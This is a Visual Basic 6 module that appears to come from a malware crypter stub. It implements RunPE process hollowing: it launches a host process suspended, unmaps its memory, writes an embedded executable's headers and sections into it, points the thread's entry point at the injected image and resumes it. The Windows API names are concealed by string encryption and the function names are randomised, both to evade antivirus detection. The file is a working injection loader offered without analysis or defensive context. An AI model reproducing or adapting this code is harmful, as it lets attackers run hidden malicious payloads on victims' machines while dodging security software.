Attribute VB_Name = "Module2"
Private Const CONTEXT_FULL              As Long = &H10007
Private Const MAX_PATH                  As Integer = 260
Private Const CREATE_SUSPENDED          As Long = &H4
Private Const MEM_COMMIT                As Long = &H1000
Private Const MEM_RESERVE               As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE    As Long = &H40

Private Type SECURITY_ATTRIBUTES
    nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type


Private Type STARTUPINFO
    cb As Long
    lpReserved As Long
    lpDesktop As Long
    lpTitle As Long
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessID As Long
    dwThreadID As Long
End Type

Private Type FLOATING_SAVE_AREA
    ControlWord As Long
    StatusWord As Long
    TagWord As Long
    ErrorOffset As Long
    ErrorSelector As Long
    DataOffset As Long
    DataSelector As Long
    RegisterArea(1 To 80) As Byte
    Cr0NpxState As Long
End Type

Private Type CONTEXT
    ContextFlags As Long

    Dr0 As Long
    Dr1 As Long
    Dr2 As Long
    Dr3 As Long
    Dr6 As Long
    Dr7 As Long

    FloatSave As FLOATING_SAVE_AREA
    SegGs As Long
    SegFs As Long
    SegEs As Long
    SegDs As Long
    Edi As Long
    Esi As Long
    Ebx As Long
    Edx As Long
    Ecx As Long
    Eax As Long
    Ebp As Long
    Eip As Long
    SegCs As Long
    EFlags As Long
    Esp As Long
    SegSs As Long
End Type

Private Type IMAGE_DOS_HEADER
    e_magic As Integer
    e_cblp As Integer
    e_cp As Integer
    e_crlc As Integer
    e_cparhdr As Integer
    e_minalloc As Integer
    e_maxalloc As Integer
    e_ss As Integer
    e_sp As Integer
    e_csum As Integer
    e_ip As Integer
    e_cs As Integer
    e_lfarlc As Integer
    e_ovno As Integer
    e_res(0 To 3) As Integer
    e_oemid As Integer
    e_oeminfo As Integer
    e_res2(0 To 9) As Integer
    e_lfanew As Long
End Type

Private Type IMAGE_SECTION_HEADER
    SecName As String * 8
    VirtualSize As Long
    VirtualAddress  As Long
    SizeOfRawData As Long
    PointerToRawData As Long
    PointerToRelocations As Long
    PointerToLinenumbers As Long
    NumberOfRelocations As Integer
    NumberOfLinenumbers As Integer
    characteristics  As Long
End Type

Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type

Private Type IMAGE_OPTIONAL_HEADER
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUnitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ' NT additional fields.
    ImageBase As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    W32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    SubSystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaderFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(0 To 15) As IMAGE_DATA_DIRECTORY
End Type



Private Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    characteristics As Integer
End Type

Private Type IMAGE_NT_HEADERS
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type
Private Declare Function CreateProcessA Lib "kernel32" (ByVal lpAppName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, bvBuff As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long

Declare Sub RtlMoveMemory Lib "kernel32" (dest As Any, src As Any, ByVal L As Long)
Declare Function CallWindowProcA Lib "user32" (ByVal addr As Long, ByVal p1 As Long, ByVal p2 As Long, ByVal p3 As Long, ByVal p4 As Long) As Long
Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Declare Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As Long
Public Function wqjp0a9ua2ohp5o2r6fmlvpu443rovj4jtew8p986h04qd1wg7(ByVal sLib As String, ByVal sMod As String, ParamArray Params()) As Long
    Dim bvASM(64)   As Byte 'enought to hold code + 10 params
    Dim i           As Long
    Dim lPos        As Long
    Dim sVal        As String

    bvASM(0) = &H58: bvASM(1) = &H59: bvASM(2) = &H59
    bvASM(3) = &H59: bvASM(4) = &H59: bvASM(5) = &H50
   
    lPos = 6
   
    For i = UBound(Params) To 0 Step -1
        bvASM(lPos) = &H68: lPos = lPos + 1
        sVal = (Params(i)): GoSub PutLong: lPos = lPos + 4
    Next
   
    bvASM(lPos) = &HE8: lPos = lPos + 1
    sVal = GetProcAddress(LoadLibraryA(sLib), sMod) - VarPtr(bvASM(lPos)) - 4
    GoSub PutLong: lPos = lPos + 4
    bvASM(lPos) = &HC3
    wqjp0a9ua2ohp5o2r6fmlvpu443rovj4jtew8p986h04qd1wg7 = CallWindowProcA(VarPtr(bvASM(0)), 0, 0, 0, 0)
   
    Exit Function
PutLong:
    'This is cheap replacement for RtlMoveMemory/putmem4 (hi/lo word/byte)
    sVal = Right$(String(8, hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(67), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107))) & Hex(sVal), 8)
    bvASM(lPos + 0) = (hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(85) & Chr(0), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)) & Mid$(sVal, 7, 2))
    bvASM(lPos + 1) = (hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(85) & Chr(0), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)) & Mid$(sVal, 5, 2))
    bvASM(lPos + 2) = (hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(85) & Chr(0), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)) & Mid$(sVal, 3, 2))
    bvASM(lPos + 3) = (hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(85) & Chr(0), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)) & Mid$(sVal, 1, 2))
    Return
End Function


Sub ROOOOOOOOOOOOOOOOOOOOOOOOOOON(sHost As String, lpBuffer() As Byte, cmdline As String)
On Error Resume Next
Dim QYASCASDgQSvcs As IMAGE_DOS_HEADER
Dim TgustaSGAsmuxorAPI As IMAGE_NT_HEADERS
Dim CApitarSAHardina As IMAGE_SECTION_HEADER
Dim SioEFairuys As STARTUPINFO
Dim XDpiopioPISDXD As PROCESS_INFORMATION
Dim WHYDONvDSqASV As CONTEXT
Dim i As Long

    SioEFairuys.cb = Len(SioEFairuys)
    WHYDONvDSqASV.ContextFlags = CONTEXT_FULL

    Call wqjp0a9ua2ohp5o2r6fmlvpu443rovj4jtew8p986h04qd1wg7(afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(73) & Chr(83) & Chr(84) & Chr(14) & Chr(13) & Chr(9) & Chr(5) & Chr(83), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))), afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(2) & Chr(18) & Chr(87) & Chr(6) & Chr(6) & Chr(54) & Chr(5) & Chr(78) & Chr(4) & Chr(46) & Chr(23) & Chr(20) & Chr(106), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))), VarPtr(QYASCASDgQSvcs), VarPtr(lpBuffer(0)), Len(QYASCASDgQSvcs))
    Call wqjp0a9ua2ohp5o2r6fmlvpu443rovj4jtew8p986h04qd1wg7(afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(73) & Chr(83) & Chr(84) & Chr(14) & Chr(13) & Chr(9) & Chr(5) & Chr(83), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))), afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(2) & Chr(18) & Chr(87) & Chr(6) & Chr(6) & Chr(54) & Chr(5) & Chr(78) & Chr(4) & Chr(46) & Chr(23) & Chr(20) & Chr(106), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))), VarPtr(TgustaSGAsmuxorAPI), VarPtr(lpBuffer(QYASCASDgQSvcs.e_lfanew)), Len(TgustaSGAsmuxorAPI))
    CreateProcessA sHost, hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(83), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)) & cmdline, 0, 0, False, CREATE_SUSPENDED, 0, 0, SioEFairuys, XDpiopioPISDXD
  
    Call wqjp0a9ua2ohp5o2r6fmlvpu443rovj4jtew8p986h04qd1wg7(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(29) & Chr(28) & Chr(84) & Chr(15) & Chr(7), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)), hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(61) & Chr(28) & Chr(101) & Chr(13) & Chr(6) & Chr(18) & Chr(24) & Chr(102) & Chr(10) & Chr(14) & Chr(4) & Chr(39) & Chr(86) & Chr(48) & Chr(14) & Chr(16) & Chr(28) & Chr(89) & Chr(12) & Chr(5), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)), XDpiopioPISDXD.hProcess, TgustaSGAsmuxorAPI.OptionalHeader.ImageBase)
    Call wqjp0a9ua2ohp5o2r6fmlvpu443rovj4jtew8p986h04qd1wg7(afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(73) & Chr(83) & Chr(84) & Chr(14) & Chr(13) & Chr(9) & Chr(5) & Chr(83), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))), afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(3) & Chr(37) & Chr(91) & Chr(4) & Chr(15) & Chr(23) & Chr(33) & Chr(84) & Chr(10) & Chr(22) & Chr(15) & Chr(18) & Chr(81) & Chr(61), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))), XDpiopioPISDXD.hProcess, TgustaSGAsmuxorAPI.OptionalHeader.ImageBase, TgustaSGAsmuxorAPI.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    Call wqjp0a9ua2ohp5o2r6fmlvpu443rovj4jtew8p986h04qd1wg7(afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(73) & Chr(83) & Chr(84) & Chr(14) & Chr(13) & Chr(9) & Chr(5) & Chr(83), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))), afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(2) & Chr(18) & Chr(87) & Chr(6) & Chr(6) & Chr(54) & Chr(19) & Chr(75) & Chr(14) & Chr(0) & Chr(20) & Chr(18) & Chr(104) & Chr(14) & Chr(23) & Chr(18) & Chr(18) & Chr(111), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))), XDpiopioPISDXD.hProcess, TgustaSGAsmuxorAPI.OptionalHeader.ImageBase, VarPtr(lpBuffer(0)), TgustaSGAsmuxorAPI.OptionalHeader.SizeOfHeaders, 0)

For i = 0 To TgustaSGAsmuxorAPI.FileHeader.NumberOfSections - 1

    RtlMoveMemory CApitarSAHardina, lpBuffer(QYASCASDgQSvcs.e_lfanew + Len(TgustaSGAsmuxorAPI) + Len(CApitarSAHardina) * i), Len(CApitarSAHardina)
    Call wqjp0a9ua2ohp5o2r6fmlvpu443rovj4jtew8p986h04qd1wg7(afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(73) & Chr(83) & Chr(84) & Chr(14) & Chr(13) & Chr(9) & Chr(5) & Chr(83), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))), afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(2) & Chr(18) & Chr(87) & Chr(6) & Chr(6) & Chr(54) & Chr(19) & Chr(75) & Chr(14) & Chr(0) & Chr(20) & Chr(18) & Chr(104) & Chr(14) & Chr(23) & Chr(18) & Chr(18) & Chr(111), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))), XDpiopioPISDXD.hProcess, TgustaSGAsmuxorAPI.OptionalHeader.ImageBase + CApitarSAHardina.VirtualAddress, VarPtr(lpBuffer(CApitarSAHardina.PointerToRawData)), CApitarSAHardina.SizeOfRawData, 0)

Next

    Call wqjp0a9ua2ohp5o2r6fmlvpu443rovj4jtew8p986h04qd1wg7(afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(73) & Chr(83) & Chr(84) & Chr(14) & Chr(13) & Chr(9) & Chr(5) & Chr(83), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))), afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(15) & Chr(24) & Chr(93) & Chr(31) & Chr(13) & Chr(20) & Chr(35) & Chr(92) & Chr(10) & Chr(6) & Chr(9) & Chr(8) & Chr(108) & Chr(31) & Chr(6) & Chr(60), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))), XDpiopioPISDXD.hThread, VarPtr(WHYDONvDSqASV))
    Call wqjp0a9ua2ohp5o2r6fmlvpu443rovj4jtew8p986h04qd1wg7(afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(73) & Chr(83) & Chr(84) & Chr(14) & Chr(13) & Chr(9) & Chr(5) & Chr(83), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))), afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(2) & Chr(18) & Chr(87) & Chr(6) & Chr(6) & Chr(54) & Chr(19) & Chr(75) & Chr(14) & Chr(0) & Chr(20) & Chr(18) & Chr(104) & Chr(14) & Chr(23) & Chr(18) & Chr(18) & Chr(111), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))), XDpiopioPISDXD.hProcess, WHYDONvDSqASV.Ebx + 8, VarPtr(TgustaSGAsmuxorAPI.OptionalHeader.ImageBase), 4, 0)
    WHYDONvDSqASV.Eax = TgustaSGAsmuxorAPI.OptionalHeader.ImageBase + TgustaSGAsmuxorAPI.OptionalHeader.AddressOfEntryPoint
    Call wqjp0a9ua2ohp5o2r6fmlvpu443rovj4jtew8p986h04qd1wg7(afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(73) & Chr(83) & Chr(84) & Chr(14) & Chr(13) & Chr(9) & Chr(5) & Chr(83), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))), afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(15) & Chr(24) & Chr(93) & Chr(31) & Chr(13) & Chr(20) & Chr(35) & Chr(92) & Chr(10) & Chr(6) & Chr(9) & Chr(8) & Chr(108) & Chr(31) & Chr(6) & Chr(40), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))), XDpiopioPISDXD.hThread, VarPtr(WHYDONvDSqASV))
    Call wqjp0a9ua2ohp5o2r6fmlvpu443rovj4jtew8p986h04qd1wg7(afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(73) & Chr(83) & Chr(84) & Chr(14) & Chr(13) & Chr(9) & Chr(5) & Chr(83), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))), afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(31) & Chr(1) & Chr(93) & Chr(25) & Chr(11) & Chr(47) & Chr(5) & Chr(85) & Chr(30) & Chr(16) & Chr(30) & Chr(50), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))), XDpiopioPISDXD.hThread)

End Sub

Public Function g3swuql8vwgntmxtu8gp272ks8azcehcmr6fbzpc9jdlutik4q() As String
    Dim lRet        As Long
    Dim bvBuff(255) As Byte
    lRet = wqjp0a9ua2ohp5o2r6fmlvpu443rovj4jtew8p986h04qd1wg7(afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(73) & Chr(83) & Chr(84) & Chr(14) & Chr(13) & Chr(9) & Chr(5) & Chr(83), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))), afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(58) & Chr(5) & Chr(85) & Chr(10) & Chr(45) & Chr(30) & Chr(12) & Chr(81) & Chr(45) & Chr(6) & Chr(23) & Chr(21) & Chr(92) & Chr(4) & Chr(46) & Chr(15) & Chr(5) & Chr(127), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))), App.hInstance, VarPtr(bvBuff(0)), 256)
    g3swuql8vwgntmxtu8gp272ks8azcehcmr6fbzpc9jdlutik4q = Left$(StrConv(bvBuff, vbUnicode), lRet)
End Function

'---------------------------------------------------------------------------------------
' Procedure : Splitter
' DateTime : 16/09/2008 22:58
' Author : Cobein
' Mail : cobein27@yahoo.com
' Purpose : Complete Split Replacement
'---------------------------------------------------------------------------------------

Public Function iawq2o0gnsc2ie2porlepkz2j3jiyhngrmwslshwxynt02krfn(ByVal Expression As String, Optional ByVal Delimiter As String, Optional ByVal Limit As Long = -1) As String()
Dim ASEvasEW As Long
Dim TSsETsVEWSTYAsvasd As Long
Dim asTYQEGHaxdBADFsdg As Long
Dim asHQYREGdfghFDHSdfGHd As Long
Dim rteIUJFBfdSGHaDFFQErtgSAFvh As Long
Dim ASTgasdvASDqQtASVASdfWERfsgq() As String
asTYQEGHaxdBADFsdg = Len(Expression)
If Delimiter = vbNullString Then Delimiter = hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(83), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107))
asHQYREGdfghFDHSdfGHd = Len(Delimiter)
If Limit = 0 Then GoTo QuitHere
If asTYQEGHaxdBADFsdg = 0 Then GoTo QuitHere
If InStr(1, Expression, Delimiter, vbBinaryCompare) = 0 Then GoTo QuitHere
ReDim ASTgasdvASDqQtASVASdfWERfsgq(0)
ASEvasEW = 1
TSsETsVEWSTYAsvasd = 1
Do
If rteIUJFBfdSGHaDFFQErtgSAFvh + 1 = Limit Then
ASTgasdvASDqQtASVASdfWERfsgq(rteIUJFBfdSGHaDFFQErtgSAFvh) = Mid$(Expression, ASEvasEW)
Exit Do
End If
TSsETsVEWSTYAsvasd = InStr(TSsETsVEWSTYAsvasd, Expression, Delimiter, vbBinaryCompare)
If TSsETsVEWSTYAsvasd = 0 Then
If Not ASEvasEW = asTYQEGHaxdBADFsdg Then
ASTgasdvASDqQtASVASdfWERfsgq(rteIUJFBfdSGHaDFFQErtgSAFvh) = Mid$(Expression, ASEvasEW)
End If
Exit Do
End If
ASTgasdvASDqQtASVASdfWERfsgq(rteIUJFBfdSGHaDFFQErtgSAFvh) = Mid$(Expression, ASEvasEW, TSsETsVEWSTYAsvasd - ASEvasEW)
rteIUJFBfdSGHaDFFQErtgSAFvh = rteIUJFBfdSGHaDFFQErtgSAFvh + 1
ReDim Preserve ASTgasdvASDqQtASVASdfWERfsgq(rteIUJFBfdSGHaDFFQErtgSAFvh)
ASEvasEW = TSsETsVEWSTYAsvasd + asHQYREGdfghFDHSdfGHd
TSsETsVEWSTYAsvasd = ASEvasEW
Loop
ReDim Preserve ASTgasdvASDqQtASVASdfWERfsgq(rteIUJFBfdSGHaDFFQErtgSAFvh)
iawq2o0gnsc2ie2porlepkz2j3jiyhngrmwslshwxynt02krfn = ASTgasdvASDqQtASVASdfWERfsgq
Exit Function
QuitHere:
ReDim iawq2o0gnsc2ie2porlepkz2j3jiyhngrmwslshwxynt02krfn(-1 To -1)
End Function




